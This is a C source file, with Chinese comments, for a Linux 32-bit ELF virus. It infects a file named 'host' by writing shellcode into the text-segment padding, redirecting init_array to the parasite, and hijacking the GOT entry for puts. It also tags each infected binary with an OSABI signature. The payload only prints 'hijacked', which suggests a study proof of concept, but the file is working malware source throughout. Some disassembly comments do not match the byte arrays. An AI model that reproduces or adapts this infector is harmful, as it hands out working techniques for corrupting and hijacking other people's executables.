#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <asm/fcntl.h>      //NOTE:这些头文件的目录
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>     //NOTE:这些头文件的目录
#include <asm/stat.h>       //NOTE:这些头文件的目录
#include <sys/mman.h>

#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)

#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x1024

#define PARASITE_ENTRY_SIZE 0x9
#define PARASITE_OFFSET_1   0xc
#define PARASITE_OFFSET_2   0x12
#define PARASITE_OFFSET_3   0x17
#define PARASITE_OFFSET_4   0x38
#define PARASITE_OFFSET_5   0x48
#define PARASITE_LEN        0x48

//#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define HOSTILEFUNC_LEN (0x4e + 1)

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int)x < 0)              \
        return PI_OPERATION_ERROR  \

#define __syscall0(type,name) \
type pi_##name(void) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name)); \
return (type)__res; \
}

#define __syscall1(type,name,type1,arg1) \
type pi_##name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1))); \
return (type)__res; \
}


#define __syscall2(type,name,type1,arg1,type2,arg2) \
type pi_##name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
return (type)__res; \
}

#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type pi_##name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                  "d" ((long)(arg3))); \
return (type)__res; \
}

#define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4) \
type pi_##name (type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4))); \
return (type)__res; \
}

#define __syscall5(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
          type5,arg5) \
type pi_##name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
return(type)__res; \
}

/* ----------------- NOTE ---------------------------
 * 当输入参数小于或者等于5个时，linux用寄存器传递参数。
 *     Linux takes system call arguments in registers:
 *     syscall number   %eax
 *     arg 1            %ebx
 *     arg 2            %ecx
 *     arg 3            %edx
 *     arg 4            %esi
 *     arg 5            %edi
 * 当输入参数大于5个时，把参数按照顺序放入连续内存中，
 * 并把这块内存的首地址放入%ebx中。
 */
static volatile void* pi_mmap(void* addr, size_t len, int prot, int flags, int fd, off_t offset)
{                                                                                              
    int ret;                                                                                 
    __asm__ volatile (                                                                         
            "subl $0x18, %%esp\n"                                                              
            "movl %1, (%%esp)\n"                                                               
            "movl %2, 0x4(%%esp)\n"                                                            
            "movl %3, 0x8(%%esp)\n"                                                            
            "movl %4, 0xc(%%esp)\n"                                                            
            "movl %5, 0x10(%%esp)\n"                                                           
            "movl %6, 0x14(%%esp)\n"                                                           
            "movl %%esp, %%ebx\n"                                                              
            "movl $90, %%eax\n"                                                    
            "int $0x80\n"                                                                      
            "addl $0x18, %%esp"                                                                
            : "=a"(ret)                                                                      
            : "a"(addr), "b"(len), "c"(prot), "d"(flags), "S"(fd), "D"(offset)
            : "memory", "cc"                                                                   
            );                                                                                 
    return (void *)ret;                                                                              
}

__syscall1(void, exit, int, status)
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count)
__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence)
__syscall2(int, fstat, int, fildes, struct stat * , buf)
__syscall2(int, rename, const char *, old, const char *, new)
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode)
__syscall1(int, close, int, fd)
__syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count)
__syscall3(int, read, int, fd, void *, buf, size_t, count)
__syscall2(int, stat, const char *, path, struct stat *, buf)


//char fclose_xor_encoded[] = "\x1e\x1b\x14\x17\x0b\x1d";

//hostilefun将劫持puts函数.
// 8049000: 55                      push   %ebp
// 8049001:	89 e5                	mov    %esp,%ebp
// 8049003:	53                   	push   %ebx
// 8049004:	83 ec 10             	sub    $0x10,%esp
// 8049007:	c6 45 ee 68          	movb   $0x68,-0x12(%ebp)
// 804900b:	c6 45 ef 69          	movb   $0x69,-0x11(%ebp)
// 804900f:	c6 45 f0 6a          	movb   $0x6a,-0x10(%ebp)
// 8049013:	c6 45 f1 61          	movb   $0x61,-0xf(%ebp)
// 8049017:	c6 45 f2 63          	movb   $0x63,-0xe(%ebp)
// 804901b:	c6 45 f3 6b          	movb   $0x6b,-0xd(%ebp)
// 804901f:	c6 45 f4 65          	movb   $0x65,-0xc(%ebp)
// 8049023:	c6 45 f5 64          	movb   $0x64,-0xb(%ebp)
// 8049027:	c6 45 f6 0a          	movb   $0xa,-0xa(%ebp)
// 804902b:	c6 45 f7 00          	movb   $0x0,-0x9(%ebp)
// 804902f:	b8 04 00 00 00       	mov    $0x4,%eax
// 8049034:	bb 01 00 00 00       	mov    $0x1,%ebx
// 8049039:	8d 4d ee             	lea    -0x12(%ebp),%ecx
// 804903c:	ba 0a 00 00 00       	mov    $0xa,%edx
// 8049041:	cd 80                	int    $0x80
// 8049043:	89 45 f8             	mov    %eax,-0x8(%ebp)
// 8049046:	8b 45 f8             	mov    -0x8(%ebp),%eax
// 8049049:	83 c4 10             	add    $0x10,%esp
// 804904c:	5b                   	pop    %ebx
// 804904d:	5d                   	pop    %ebp
// 804904e:	c3                   	ret    
char hostilefunc[] = 
    "\x55"
    "\x89\xe5"
    "\x53"
    "\x83\xec\x10"
    "\xc6\x45\xee\x68"
    "\xc6\x45\xef\x69"
    "\xc6\x45\xf0\x6a"
    "\xc6\x45\xf1\x61"
    "\xc6\x45\xf2\x63"
    "\xc6\x45\xf3\x6b"
    "\xc6\x45\xf4\x65"
    "\xc6\x45\xf5\x64"
    "\xc6\x45\xf6\x0a"
    "\xc6\x45\xf7\x00"
    "\xb8\x04\x00\x00\x00"
    "\xbb\x01\x00\x00\x00"
    "\x8d\x4d\xee"
    "\xba\x0a\x00\x00\x00"
    "\xcd\x80"
    "\x89\x45\xf8"
    "\x8b\x45\xf8"
    "\x83\xc4\x10"
    "\x5b"
    "\x5d"
    "\xc3";

//病毒代码,使用PIC(Position Independent Code)技术
// 08049000 <parasite>:
// 8049000:	55                   	push   %ebp
// 8049001:	89 e5                	mov    %esp,%ebp
// 8049003:	60                   	pusha  
// 8049004:	e8 38 00 00 00       	call   804903b <b1>
// 8049009:	5b                   	pop    %ebx
// 804900a:	81 eb 41 41 41 41    	sub    $0x41414141,%ebx
// 8049010:	81 c3 42 42 42 42    	add    $0x42424242,%ebx
// 8049016:	b9 43 43 43 43       	mov    $0x43434343,%ecx
// 804901b:	ba 01 00 00 00       	mov    $0x1,%edx
// 8049020:	83 ca 02             	or     $0x2,%edx
// 8049023:	83 ca 04             	or     $0x4,%edx
// 8049026:	b8 7d 00 00 00       	mov    $0x4,%eax
// 804902b:	cd 80                	int    $0x80
// 804902d:	e8 0e 00 00 00       	call   804903d <b3>
// 8049032:	58                   	pop    %eax
// 8049033:	83 c0 1666666           add    $0x16,%eax
// 8049036:	89 80 44 44 44 44    	mov    %eax,0x44444444(%eax)
// 804903c:	61                   	popa   
// 804903d:	89 ec  					mov %ebp,%esp
// 804903f: 5d						pop %ebp
// 8049040: c3                   	ret    
// 8049041:	eb c9                	jmp    8049009 <b0>
// 8049043:	eb f0                	jmp    8049032 <b4>
// 8049045:	90 90                	nop nop
// 8049047:	90                   	nop
// 8049048:	90                   	nop
char parasite[] = 
    "\x55"
    "\x89\xe5"
    "\x60"
    "\xe8\x38\x00\x00\x00"
    "\x5b"
    "\x81\xeb\x41\x41\x41\x41"
    "\x81\xc3\x42\x42\x42\x42"
    "\xb9\x43\x43\x43\x43"
    "\xba\x01\x00\x00\x00"
    "\x83\xca\x02"
    "\x83\xca\x04"
    "\xb8\x7d\x00\x00\x00" 
    "\xcd\x80"
    "\xe8\x11\x00\x00\x00"
    "\x58"
    "\x83\xc0\x16"
    "\x89\x80\x44\x44\x44\x44"
    "\x61"
	"\x89\xec"
	"\x5d"
    "\xc3"
    "\xeb\xc6"
    "\xeb\xed"
    "\x90\x90"
    "\x90"
    "\x90";

typedef struct linux_dirent

{
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char     d_name[];
} linux_dirent_t;

typedef struct targetfunc
{
    uint32_t func_got;
    uint32_t func_name_len;
    char  func_name[64];
} targetfunc_t;

typedef struct elfstructs
{
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Phdr *textphdr;
    Elf32_Shdr *shdr;
    Elf32_Sym *dyn_symtab;
    Elf32_Dyn *dynseg;
    Elf32_Rel *rel;
    Elf32_Addr *pltgot;
    Elf32_Rel *pltrel;
    Elf32_Word relsz;
    Elf32_Word pltrelsz;
    Elf32_Addr *initarray;
    Elf32_Addr gnureloc_start;
    Elf32_Word gnureloc_sz;
    char *dyn_strtab;
} elfstructs_t;


typedef struct loadsegments
{
    Elf32_Addr code_vaddr;
    Elf32_Addr data_vaddr;
    Elf32_Off code_offset;
    Elf32_Off data_offset;
    Elf32_Word code_size;
    Elf32_Word data_size;
} loadsegments_t;


typedef struct elf_flags
{
    uint32_t    bind_now;
} elf_flags_t;


typedef struct target_elf
{
    char name[64];
    uint8_t *mmap;
    int fd;
    int filehole;
    elfstructs_t elfstructs;
    loadsegments_t loadsegments;
    targetfunc_t targetfunc;
    elf_flags_t elf_flags;
    struct stat st;
} target_elf_t;

target_elf_t target_elf;

inline_function void pi_strcpy(char *dest,const char *src)
{
    while (*src) *dest++ = *src++;
    *dest = *src;
}

inline_function int pi_strlen(const char *str)
{
    int len = 0;
    
    while (*str++) ++len;
    
    return len;
}

inline_function void pi_memcpy(void *dest,void *src,int len)
{
    uint8_t* d = (uint8_t *)dest;
    uint8_t* s = (uint8_t *)src;
    while(len--) *((uint8_t *)d++) = *((uint8_t *)s++);
}

inline_function int pi_memcmp(void *mem1,void *mem2,int len)
{
    uint8_t* m1 = (uint8_t *)mem1;
    uint8_t* m2 = (uint8_t *)mem2;
    while (len--)
    {
        if (*((uint8_t *)m1++) != *((uint8_t *)m2++))
            return MEM_NOT_EQUAL;
    }

    return MEM_EQUAL;
}

inline_function void pi_memset(void *mem,int val,int len)
{
    uint8_t* m = (uint8_t *)mem;
    while (len--) *((uint8_t *)m++) = val;
}

//inline_function void pi_xor_mem(void *mem,int len,uint8_t xor_key)
//{
//    uint8_t* m = (uint8_t *)mem;
//    while (len--) *((uint8_t *)m++) ^= xor_key;
//}

int pi_check_target(void)
{
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    char elfmag[] = ELFMAG; //0x177ELF
    int dyn_linked = 0;


    target_elf.fd = pi_open(&(target_elf.name[0]), O_RDWR, 0);
    pi_check_syscall_fault(target_elf.fd);

    pi_check_syscall_fault(pi_fstat(target_elf.fd, &(target_elf.st)));

    target_elf.mmap = (uint8_t *)pi_mmap(NULL,
                               target_elf.st.st_size,
                               PROT_READ | PROT_WRITE,
                               MAP_SHARED,
                               target_elf.fd,
                               0);
    if (target_elf.mmap == 0)
        return PI_OPERATION_ERROR;

    ehdr = (Elf32_Ehdr *)target_elf.mmap;
    phdr = (Elf32_Phdr *)(target_elf.mmap + ehdr->e_phoff);

    if (pi_memcmp(target_elf.mmap, elfmag, SELFMAG) == MEM_NOT_EQUAL)
        return PI_OPERATION_ERROR;
    
    //binary is infected before ? 
    if (ehdr->e_ident[EI_OSABI] == PI_SIGNATURE)
        return PI_OPERATION_ERROR;
    
    if (!((ehdr->e_type == ET_EXEC) || (ehdr->e_type == ET_DYN)))
        return PI_OPERATION_ERROR;
    
    for (uint32_t i = 0; i < ehdr->e_phnum; ++i,++phdr)
    {
        if (phdr->p_type != PT_DYNAMIC)
            continue;
        dyn_linked = 1;
    }

    if (!dyn_linked)
        return PI_OPERATION_ERROR;
    
    return PI_OPERATION_SUCCESS;
}


void pi_do_init(void)
{
    Elf32_Phdr  *tmp_phdr;
    Elf32_Shdr  *tmp_shdr;
    Elf32_Dyn   *tmp_dynseg;
    Elf32_Sym   *tmp_dynsym;
    Elf32_Addr  target_code_vaddr, target_data_vaddr;
    Elf32_Off   target_code_offset, target_data_offset;

    target_elf.elfstructs.ehdr = (Elf32_Ehdr *)target_elf.mmap;
    target_elf.elfstructs.phdr = (Elf32_Phdr *)(target_elf.mmap + target_elf.elfstructs.ehdr->e_phoff);
    target_elf.elfstructs.shdr = (Elf32_Shdr *)(target_elf.mmap + target_elf.elfstructs.ehdr->e_shoff);


    tmp_phdr = target_elf.elfstructs.phdr;
    for (Elf32_Half i = 0; i < target_elf.elfstructs.ehdr->e_phnum; ++i, ++tmp_phdr)
    {
        switch (tmp_phdr->p_type)
        {
            case PT_LOAD:
                if (tmp_phdr->p_flags & PF_X)
                {
                    target_elf.loadsegments.code_vaddr   = tmp_phdr->p_vaddr;   //0x8049000
                    target_elf.loadsegments.code_offset  = tmp_phdr->p_offset;  //0x1000 
                    target_elf.loadsegments.code_size    = tmp_phdr->p_memsz;   //0x218
                    target_elf.elfstructs.textphdr       = tmp_phdr;
                
                    target_code_vaddr  = target_elf.loadsegments.code_vaddr;
                    target_code_offset = target_elf.loadsegments.code_offset;
                
                }
                target_elf.loadsegments.data_vaddr  = tmp_phdr->p_vaddr;
                target_elf.loadsegments.data_offset = tmp_phdr->p_offset;

                target_data_vaddr  = target_elf.loadsegments.data_vaddr;        //0x804bf08
                target_data_offset = target_elf.loadsegments.data_offset;       //0x2f08
                break;

            case PT_DYNAMIC:
                target_elf.elfstructs.dynseg = (Elf32_Dyn *)(target_elf.mmap + tmp_phdr->p_offset);
                break;
            
            case PT_GNU_RELRO:
                target_elf.elfstructs.gnureloc_sz    = tmp_phdr->p_memsz;       //0xf8
                target_elf.elfstructs.gnureloc_start = tmp_phdr->p_vaddr - target_elf.elfstructs.textphdr->p_vaddr; //0x2f08
                break;
        }
    }

    tmp_dynseg = target_elf.elfstructs.dynseg;
    for (; tmp_dynseg->d_tag != DT_NULL; ++tmp_dynseg)
    {
        switch (tmp_dynseg->d_tag)
        {
            case DT_SYMTAB:
                target_elf.elfstructs.dyn_symtab = (Elf32_Sym *)(target_elf.mmap + target_code_offset +
                                                                     (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_STRTAB:
                target_elf.elfstructs.dyn_strtab = target_elf.mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr);
                break;

            case DT_JMPREL:
                target_elf.elfstructs.pltrel = (Elf32_Rel *)(target_elf.mmap + target_code_offset +
                                                                      (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_PLTGOT:
                target_elf.elfstructs.pltgot = (Elf32_Addr *)(target_elf.mmap + target_data_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_data_vaddr));
            case DT_REL:
                target_elf.elfstructs.rel = (Elf32_Rel *)(target_elf.mmap + target_code_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_RELSZ:
                target_elf.elfstructs.relsz = tmp_dynseg->d_un.d_val;      //0x0 
                break;

            case DT_PLTRELSZ:
                target_elf.elfstructs.pltrelsz = tmp_dynseg->d_un.d_val;    //0x10
                break;

            case DT_FLAGS_1:
                if (tmp_dynseg->d_un.d_val & DF_1_NOW)
                    ++target_elf.elf_flags.bind_now;
                break;

            case DT_INIT_ARRAY:
                target_elf.elfstructs.initarray = (Elf32_Addr *)(target_elf.mmap + (tmp_dynseg->d_un.d_ptr -
                                                                                           target_data_vaddr + target_data_offset));
                break;
        }
    }
}


int pi_symbol_lookup(void)
{
    char *dynstrtab;
    char *sym_name;
    Elf32_Rel  *rel;
    Elf32_Word relsz;
    Elf32_Sym   *dynsymtab;
        

    if (target_elf.elf_flags.bind_now && !target_elf.elfstructs.pltrel)
    {
        rel     = target_elf.elfstructs.rel;
        relsz   = target_elf.elfstructs.relsz;

    }else
    {
        rel     = target_elf.elfstructs.pltrel;
        relsz   = target_elf.elfstructs.pltrelsz;
    }


    dynsymtab = target_elf.elfstructs.dyn_symtab;
    dynstrtab = target_elf.elfstructs.dyn_strtab;
    
    for (Elf32_Word i = 0; i < (relsz / sizeof(Elf32_Rel)); ++i, ++rel)
    {
        sym_name = &dynstrtab[dynsymtab[ELF32_R_SYM(rel->r_info)].st_name];
        //`puts` GOT 0x804c00c
        if (sym_name[0] == 'p' && sym_name[1] == 'u' && sym_name[2] == 't' && sym_name[3] == 's')
                target_elf.targetfunc.func_got = (Elf32_Addr)rel->r_offset;
    }

    if (!target_elf.targetfunc.func_got)
        return PI_OPERATION_ERROR;

    return PI_OPERATION_SUCCESS;
}

/*
 * flcose's GOT entry hijacking is done @ runtime with the following algorithm:
 *      - let r be any register
 *      - (r) holds hostile function address
 *      - [ fclose_got_entry_offset + rip ]  <- r , let this instruction's address be #modify_got
 *      - [ addr ] is the address of the next instruction that modifies the GOT entry (the next to [#modify_got])
 *      - [ diff ] is the offset between the target GOT entry and [ addr ]
 *
 *      - so it will be like this
 *         - mov $address_of_hostile, diff(%rip) 
 *
 * the parasite takes care of ELF binaries that have the BIND_NOW flag so the entry of the parasite
 * mprotects the GNU_RELRO PAGES to be writeable  
*/

void pi_edit_parasite(void)
{
    uint32_t diff, addr, var1, var2, var3;

    var1 = target_elf.loadsegments.code_size + PARASITE_ENTRY_SIZE;         //0x221

    //var2 = PAGE_ALIGN_LOW(target_elf.elfstructs.gnureloc_start);            //0x2000 ??? 0x2f08
    var2 = target_elf.elfstructs.gnureloc_start;

    var3 = target_elf.elfstructs.gnureloc_sz;                               //0xf8

    addr = target_elf.loadsegments.code_vaddr + 
                        target_elf.loadsegments.code_size + 
                                                    PARASITE_OFFSET_5;      //0x804926c

    diff = target_elf.targetfunc.func_got - addr;                           //0x2da0
    //diff += 0xc;


    //#define PARASITE_ENTRY_SIZE 0x9
    //#define PARASITE_OFFSET_1   0xc 
    //#define PARASITE_OFFSET_2   0x12 
    //#define PARASITE_OFFSET_3   0x17
    //#define PARASITE_OFFSET_4   0x38
    //#define PARASITE_OFFSET_5   0x48
    *((uint32_t *)&parasite[PARASITE_OFFSET_1]) = (uint32_t)var1;
    *((uint32_t *)&parasite[PARASITE_OFFSET_2]) = (uint32_t)var2;
    *((uint32_t *)&parasite[PARASITE_OFFSET_3]) = (uint32_t)var3;
    *((uint32_t *)&parasite[PARASITE_OFFSET_4]) = (uint32_t)diff;
}

int pi_create_infected_clone(void)
{
    char     tmpfile[] = ".v";
    char     buf[PAGE_SIZE];
    int  tmpfile_fd, syscall_ret;
    uint32_t buf1_sz, buf2_sz, buf3_sz;
    mode_t tmpfile_mode;
    
    //mark binary as infected
    target_elf.elfstructs.ehdr->e_ident[EI_OSABI] = PI_SIGNATURE;

    tmpfile_fd = pi_open(tmpfile, O_CREAT | O_WRONLY | O_TRUNC, target_elf.st.st_mode);
    pi_check_syscall_fault(tmpfile_fd);

    buf1_sz = target_elf.loadsegments.code_offset + 
                        target_elf.loadsegments.code_size + 
                                target_elf.filehole;
    
    buf2_sz = ( PARASITE_LEN + HOSTILEFUNC_LEN ) > target_elf.filehole ? PAGE_SIZE : 0;
    
    buf3_sz = target_elf.st.st_size - buf1_sz;

    syscall_ret = pi_write(tmpfile_fd, target_elf.mmap, buf1_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd, buf, buf2_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd, target_elf.mmap + buf1_sz, buf3_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_lseek(tmpfile_fd,
                           target_elf.loadsegments.code_offset + 
                           target_elf.loadsegments.code_size,
                           SEEK_SET);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd, parasite, PARASITE_LEN);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,
                          hostilefunc,
                          HOSTILEFUNC_LEN);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_close(tmpfile_fd);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_rename(tmpfile, target_elf.name);
    pi_check_syscall_fault(syscall_ret);

    return PI_OPERATION_SUCCESS;
}

//
void pi_infect_target(void)
{
    Elf32_Phdr  *elfphdr;
    Elf32_Shdr  *elfshdr;
    Elf32_Rel  *elfrel;
    Elf32_Addr  target_code_vaddr, target_data_vaddr;
    Elf32_Off   target_code_offset, target_data_offset;
    Elf32_Word target_code_size, target_data_size;
    uint32_t    flag, parasite_len, off, addr;
    uint8_t old_osabi;

    if (pi_check_target() == PI_OPERATION_ERROR)
        goto target_cleanup;

    pi_do_init();

    if (pi_symbol_lookup() == PI_OPERATION_ERROR)
        goto target_cleanup;


    elfphdr = target_elf.elfstructs.phdr;
    elfshdr = target_elf.elfstructs.shdr;
    elfrel = target_elf.elfstructs.rel;

    target_code_vaddr  = target_elf.loadsegments.code_vaddr;
    target_data_vaddr  = target_elf.loadsegments.data_vaddr;

    target_code_offset = target_elf.loadsegments.code_offset;


    target_code_size   = target_elf.loadsegments.code_size;
    target_data_size   = target_elf.loadsegments.data_size;

    flag         = 1;
    parasite_len = PARASITE_LEN;

    if ((parasite_len  + HOSTILEFUNC_LEN) > 
             (PAGE_SIZE - VADDR_OFFSET(target_code_vaddr + target_code_size)))
        return;

    //调整段头
    for (Elf32_Half i = 0; i < target_elf.elfstructs.ehdr->e_phnum; ++i, ++elfphdr)
    {
        if (elfphdr->p_offset > (target_code_offset + target_code_size))
        {
            if (flag)
            {
                //0xde8
                target_elf.filehole = elfphdr->p_offset - (target_code_offset + target_code_size);
                --flag;  
            }
            if (parasite_len + HOSTILEFUNC_LEN > target_elf.filehole)
                elfphdr->p_offset += PAGE_SIZE;
        }
    }
    
    //调整节头
    if (target_elf.elfstructs.shdr)
    {
        for (Elf32_Half i = 0; i < target_elf.elfstructs.ehdr->e_shnum; ++i, ++elfshdr)
        {
            //.fini section
            if ((elfshdr->sh_offset + elfshdr->sh_size) == (target_code_offset + target_code_size))
                //elfshdr->sh_size += parasite_len;
                elfshdr->sh_size += parasite_len + HOSTILEFUNC_LEN;

            if (elfshdr->sh_offset > (target_code_offset + target_code_size))
            {
                if ((parasite_len + HOSTILEFUNC_LEN) > target_elf.filehole)
                    elfshdr->sh_offset += PAGE_SIZE;
            }
        }
        if (parasite_len + HOSTILEFUNC_LEN > target_elf.filehole)
            target_elf.elfstructs.ehdr->e_shoff += PAGE_SIZE;
    }

    /*
     * - pivirus doesn't alter the original entry point of the target , instead the entry in the init array section that
     *   corresponds to frame dummy function's address is overwritten with the address of the parasite's entry point
     * 
     * - for ET_DYN binaries there will be a relocation entry for every entry in the init array section with the r_addend member
     *   of the relocation entry holding the offset of the function in the binary, so the dynamic linker will add the loading
     *   address of the binary to r_addend value and modify the  init array section's entry @ r_offset
     */
    if (target_elf.elfstructs.ehdr->e_type == ET_DYN) //?????
    {
        for (uint32_t i = 0; i < (target_elf.elfstructs.relsz / sizeof(Elf32_Rel)); ++i, ++elfrel)
        {
            if (ELF32_R_TYPE(elfrel->r_info) == R_386_RELATIVE)
            {
                if (elfrel->r_offset == (Elf32_Sword)(target_elf.elfstructs.initarray[0]))
                {
                    elfrel->r_offset = (Elf32_Sword)(target_code_vaddr + target_code_size);
                    break;
                }
            }
        }
    }
    //overwrite initarray[0]
    *target_elf.elfstructs.initarray = target_code_vaddr + target_code_size;
    target_elf.elfstructs.textphdr->p_memsz  += parasite_len + HOSTILEFUNC_LEN;
    target_elf.elfstructs.textphdr->p_filesz += parasite_len + HOSTILEFUNC_LEN;

    pi_edit_parasite();
    
    old_osabi = target_elf.elfstructs.ehdr->e_ident[EI_OSABI];

    if (pi_create_infected_clone() == PI_OPERATION_ERROR)
        target_elf.elfstructs.ehdr->e_ident[EI_OSABI] = old_osabi; //infection fails so unmark the binary

target_cleanup:
    pi_close(target_elf.fd);
}

int pi()
{
    char dirents_buf[DIRENTS_BUF_SIZE];
    int fd, nread;
    linux_dirent_t *dir;
    char cwd[2];

    cwd[0] = '.';
    cwd[1] = 0;

    fd = pi_open(cwd, O_RDONLY | O_DIRECTORY, 0);
    pi_check_syscall_fault(fd);

    nread = pi_getdents(fd, dirents_buf, DIRENTS_BUF_SIZE);
    pi_check_syscall_fault(nread);

    for (int pos = 0; pos < nread;  pos += dir->d_reclen)
    {
        dir = (struct linux_dirent *)(dirents_buf + pos);

        if (dir->d_name[0] == 'h' && dir->d_name[1] == 'o' && dir->d_name[2] == 's'
                && dir->d_name[3] == 't' && dir->d_name[4] == '\0')
        {

            pi_memcpy(target_elf.name, dir->d_name, 5);

            pi_infect_target();
        }

    }

    return PI_OPERATION_SUCCESS;
}

void _start()
{
    pi();
    pi_exit(0);
}

